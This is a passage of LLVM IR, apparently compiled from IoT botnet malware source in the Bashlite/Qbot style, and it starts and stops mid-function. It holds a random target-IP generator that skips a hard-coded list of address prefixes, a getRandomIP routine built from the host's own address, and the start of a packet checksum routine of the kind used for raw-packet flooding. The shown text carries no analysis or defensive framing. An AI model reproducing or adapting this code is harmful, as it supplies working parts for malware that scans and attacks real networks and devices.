  %149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 113
  br i1 %151, label %536, label %152

152:                                              ; preds = %148, %144, %140
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 188
  br i1 %155, label %156, label %164

156:                                              ; preds = %152
  %157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 209
  br i1 %159, label %160, label %164

160:                                              ; preds = %156
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 52
  br i1 %163, label %536, label %164

164:                                              ; preds = %160, %156, %152
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 188
  br i1 %167, label %168, label %176

168:                                              ; preds = %164
  %169 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 209
  br i1 %171, label %172, label %176

172:                                              ; preds = %168
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 49
  br i1 %175, label %536, label %176

176:                                              ; preds = %172, %168, %164
  %177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 185
  br i1 %179, label %180, label %188

180:                                              ; preds = %176
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 62
  br i1 %183, label %184, label %188

184:                                              ; preds = %180
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 190
  br i1 %187, label %536, label %188

188:                                              ; preds = %184, %180, %176
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 185
  br i1 %191, label %192, label %200

192:                                              ; preds = %188
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 62
  br i1 %195, label %196, label %200

196:                                              ; preds = %192
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 189
  br i1 %199, label %536, label %200

200:                                              ; preds = %196, %192, %188
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %202 = zext i8 %201 to i32
  %203 = icmp eq i32 %202, 185
  br i1 %203, label %204, label %212

204:                                              ; preds = %200
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 62
  br i1 %207, label %208, label %212

208:                                              ; preds = %204
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 188
  br i1 %211, label %536, label %212

212:                                              ; preds = %208, %204, %200
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 185
  br i1 %215, label %216, label %224

216:                                              ; preds = %212
  %217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 61
  br i1 %219, label %220, label %224

220:                                              ; preds = %216
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 137
  br i1 %223, label %536, label %224

224:                                              ; preds = %220, %216, %212
  %225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 185
  br i1 %227, label %228, label %236

228:                                              ; preds = %224
  %229 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %230 = zext i8 %229 to i32
  %231 = icmp eq i32 %230, 61
  br i1 %231, label %232, label %236

232:                                              ; preds = %228
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 136
  br i1 %235, label %536, label %236

236:                                              ; preds = %232, %228, %224
  %237 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 185
  br i1 %239, label %240, label %248

240:                                              ; preds = %236
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 11
  br i1 %243, label %244, label %248

244:                                              ; preds = %240
  %245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 147
  br i1 %247, label %536, label %248

248:                                              ; preds = %244, %240, %236
  %249 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 185
  br i1 %251, label %252, label %260

252:                                              ; preds = %248
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 11
  br i1 %255, label %256, label %260

256:                                              ; preds = %252
  %257 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 146
  br i1 %259, label %536, label %260

260:                                              ; preds = %256, %252, %248
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %262 = zext i8 %261 to i32
  %263 = icmp eq i32 %262, 185
  br i1 %263, label %264, label %272

264:                                              ; preds = %260
  %265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 11
  br i1 %267, label %268, label %272

268:                                              ; preds = %264
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 145
  br i1 %271, label %536, label %272

272:                                              ; preds = %268, %264, %260
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 63
  br i1 %275, label %276, label %284

276:                                              ; preds = %272
  %277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 141
  br i1 %279, label %280, label %284

280:                                              ; preds = %276
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %282 = zext i8 %281 to i32
  %283 = icmp eq i32 %282, 241
  br i1 %283, label %536, label %284

284:                                              ; preds = %280, %276, %272
  %285 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 69
  br i1 %287, label %288, label %296

288:                                              ; preds = %284
  %289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 30
  br i1 %291, label %292, label %296

292:                                              ; preds = %288
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 192
  br i1 %295, label %536, label %296

296:                                              ; preds = %292, %288, %284
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 69
  br i1 %299, label %300, label %308

300:                                              ; preds = %296
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %302 = zext i8 %301 to i32
  %303 = icmp eq i32 %302, 30
  br i1 %303, label %304, label %308

304:                                              ; preds = %300
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 244
  br i1 %307, label %536, label %308

308:                                              ; preds = %304, %300, %296
  %309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 69
  br i1 %311, label %312, label %320

312:                                              ; preds = %308
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %314 = zext i8 %313 to i32
  %315 = icmp eq i32 %314, 197
  br i1 %315, label %316, label %320

316:                                              ; preds = %312
  %317 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %318 = zext i8 %317 to i32
  %319 = icmp eq i32 %318, 128
  br i1 %319, label %536, label %320

320:                                              ; preds = %316, %312, %308
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %322 = zext i8 %321 to i32
  %323 = icmp eq i32 %322, 162
  br i1 %323, label %324, label %332

324:                                              ; preds = %320
  %325 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 251
  br i1 %327, label %328, label %332

328:                                              ; preds = %324
  %329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 120
  br i1 %331, label %536, label %332

332:                                              ; preds = %328, %324, %320
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 173
  br i1 %335, label %336, label %344

336:                                              ; preds = %332
  %337 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 208
  br i1 %339, label %340, label %344

340:                                              ; preds = %336
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = icmp eq i32 %342, 128
  br i1 %343, label %536, label %344

344:                                              ; preds = %340, %336, %332
  %345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 173
  br i1 %347, label %348, label %356

348:                                              ; preds = %344
  %349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %350 = zext i8 %349 to i32
  %351 = icmp eq i32 %350, 208
  br i1 %351, label %352, label %356

352:                                              ; preds = %348
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 180
  br i1 %355, label %536, label %356

356:                                              ; preds = %352, %348, %344
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 173
  br i1 %359, label %360, label %368

360:                                              ; preds = %356
  %361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %362 = zext i8 %361 to i32
  %363 = icmp eq i32 %362, 208
  br i1 %363, label %364, label %368

364:                                              ; preds = %360
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 250
  br i1 %367, label %536, label %368

368:                                              ; preds = %364, %360, %356
  %369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 192
  br i1 %371, label %372, label %380

372:                                              ; preds = %368
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 187
  br i1 %375, label %376, label %380

376:                                              ; preds = %372
  %377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %378 = zext i8 %377 to i32
  %379 = icmp eq i32 %378, 113
  br i1 %379, label %536, label %380

380:                                              ; preds = %376, %372, %368
  %381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %382 = zext i8 %381 to i32
  %383 = icmp eq i32 %382, 198
  br i1 %383, label %384, label %392

384:                                              ; preds = %380
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 204
  br i1 %387, label %388, label %392

388:                                              ; preds = %384
  %389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 241
  br i1 %391, label %536, label %392

392:                                              ; preds = %388, %384, %380
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 204
  br i1 %395, label %396, label %404

396:                                              ; preds = %392
  %397 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 10
  br i1 %399, label %400, label %404

400:                                              ; preds = %396
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %402 = zext i8 %401 to i32
  %403 = icmp eq i32 %402, 160
  br i1 %403, label %536, label %404

404:                                              ; preds = %400, %396, %392
  %405 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 204
  br i1 %407, label %408, label %416

408:                                              ; preds = %404
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 12
  br i1 %411, label %412, label %416

412:                                              ; preds = %408
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 192
  br i1 %415, label %536, label %416

416:                                              ; preds = %412, %408, %404
  %417 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %418 = zext i8 %417 to i32
  %419 = icmp eq i32 %418, 208
  br i1 %419, label %420, label %428

420:                                              ; preds = %416
  %421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %422 = zext i8 %421 to i32
  %423 = icmp eq i32 %422, 110
  br i1 %423, label %424, label %428

424:                                              ; preds = %420
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 64
  br i1 %427, label %536, label %428

428:                                              ; preds = %424, %420, %416
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 208
  br i1 %431, label %432, label %440

432:                                              ; preds = %428
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 110
  br i1 %435, label %436, label %440

436:                                              ; preds = %432
  %437 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 72
  br i1 %439, label %536, label %440

440:                                              ; preds = %436, %432, %428
  %441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %442 = zext i8 %441 to i32
  %443 = icmp eq i32 %442, 208
  br i1 %443, label %444, label %448

444:                                              ; preds = %440
  %445 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 67
  br i1 %447, label %536, label %448

448:                                              ; preds = %444, %440
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 94
  br i1 %451, label %452, label %460

452:                                              ; preds = %448
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %454 = zext i8 %453 to i32
  %455 = icmp eq i32 %454, 102
  br i1 %455, label %456, label %460

456:                                              ; preds = %452
  %457 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %458 = zext i8 %457 to i32
  %459 = icmp eq i32 %458, 48
  br i1 %459, label %536, label %460

460:                                              ; preds = %456, %452, %448
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %462 = zext i8 %461 to i32
  %463 = icmp eq i32 %462, 93
  br i1 %463, label %464, label %472

464:                                              ; preds = %460
  %465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 174
  br i1 %467, label %468, label %472

468:                                              ; preds = %464
  %469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %470 = zext i8 %469 to i32
  %471 = icmp eq i32 %470, 88
  br i1 %471, label %536, label %472

472:                                              ; preds = %468, %464, %460
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %474 = zext i8 %473 to i32
  %475 = icmp eq i32 %474, 89
  br i1 %475, label %476, label %484

476:                                              ; preds = %472
  %477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %478 = zext i8 %477 to i32
  %479 = icmp eq i32 %478, 248
  br i1 %479, label %480, label %484

480:                                              ; preds = %476
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %482 = zext i8 %481 to i32
  %483 = icmp eq i32 %482, 174
  br i1 %483, label %536, label %484

484:                                              ; preds = %480, %476, %472
  %485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 89
  br i1 %487, label %488, label %496

488:                                              ; preds = %484
  %489 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 248
  br i1 %491, label %492, label %496

492:                                              ; preds = %488
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %494 = zext i8 %493 to i32
  %495 = icmp eq i32 %494, 172
  br i1 %495, label %536, label %496

496:                                              ; preds = %492, %488, %484
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %498 = zext i8 %497 to i32
  %499 = icmp eq i32 %498, 89
  br i1 %499, label %500, label %508

500:                                              ; preds = %496
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %502 = zext i8 %501 to i32
  %503 = icmp eq i32 %502, 248
  br i1 %503, label %504, label %508

504:                                              ; preds = %500
  %505 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 170
  br i1 %507, label %536, label %508

508:                                              ; preds = %504, %500, %496
  %509 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %510 = zext i8 %509 to i32
  %511 = icmp eq i32 %510, 89
  br i1 %511, label %512, label %520

512:                                              ; preds = %508
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 248
  br i1 %515, label %516, label %520

516:                                              ; preds = %512
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %518 = zext i8 %517 to i32
  %519 = icmp eq i32 %518, 169
  br i1 %519, label %536, label %520

520:                                              ; preds = %516, %512, %508
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 89
  br i1 %523, label %524, label %532

524:                                              ; preds = %520
  %525 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 248
  br i1 %527, label %528, label %532

528:                                              ; preds = %524
  %529 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %530 = zext i8 %529 to i32
  %531 = icmp eq i32 %530, 160
  br i1 %531, label %536, label %532

532:                                              ; preds = %528, %524, %520
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %534 = zext i8 %533 to i32
  %535 = icmp sge i32 %534, 224
  br label %536

536:                                              ; preds = %532, %528, %516, %504, %492, %480, %468, %456, %444, %436, %424, %412, %400, %388, %376, %364, %352, %340, %328, %316, %304, %292, %280, %268, %256, %244, %232, %220, %208, %196, %184, %172, %160, %148, %136, %124, %120, %112, %104, %92, %80, %68, %60, %56, %44, %40
  %537 = phi i1 [ true, %528 ], [ true, %516 ], [ true, %504 ], [ true, %492 ], [ true, %480 ], [ true, %468 ], [ true, %456 ], [ true, %444 ], [ true, %436 ], [ true, %424 ], [ true, %412 ], [ true, %400 ], [ true, %388 ], [ true, %376 ], [ true, %364 ], [ true, %352 ], [ true, %340 ], [ true, %328 ], [ true, %316 ], [ true, %304 ], [ true, %292 ], [ true, %280 ], [ true, %268 ], [ true, %256 ], [ true, %244 ], [ true, %232 ], [ true, %220 ], [ true, %208 ], [ true, %196 ], [ true, %184 ], [ true, %172 ], [ true, %160 ], [ true, %148 ], [ true, %136 ], [ true, %124 ], [ true, %120 ], [ true, %112 ], [ true, %104 ], [ true, %92 ], [ true, %80 ], [ true, %68 ], [ true, %60 ], [ true, %56 ], [ true, %44 ], [ true, %40 ], [ %535, %532 ]
  br i1 %537, label %538, label %551

538:                                              ; preds = %536
  %539 = call i32 @rand() #12
  %540 = srem i32 %539, 255
  %541 = trunc i32 %540 to i8
  store i8 %541, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %542 = call i32 @rand() #12
  %543 = srem i32 %542, 255
  %544 = trunc i32 %543 to i8
  store i8 %544, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %545 = call i32 @rand() #12
  %546 = srem i32 %545, 255
  %547 = trunc i32 %546 to i8
  store i8 %547, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %548 = call i32 @rand() #12
  %549 = srem i32 %548, 255
  %550 = trunc i32 %549 to i8
  store i8 %550, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %40, !llvm.loop !33

551:                                              ; preds = %536
  %552 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %552, i8 0, i64 16, i1 false)
  %553 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i64 0, i64 0
  %554 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %555 = zext i8 %554 to i32
  %556 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %557 = zext i8 %556 to i32
  %558 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %559 = zext i8 %558 to i32
  %560 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %561 = zext i8 %560 to i32
  %562 = call i32 (i8*, i8*, ...) @szprintf(i8* %553, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i64 0, i64 0), i32 %555, i32 %557, i32 %559, i32 %561)
  %563 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i64 0, i64 0
  %564 = call i32 @inet_addr(i8* %563) #12
  store i32 %564, i32* %1, align 4
  br label %565

565:                                              ; preds = %551, %11
  %566 = load i32, i32* %1, align 4
  ret i32 %566
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomIP(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #15
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @csum(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !34

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !35

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
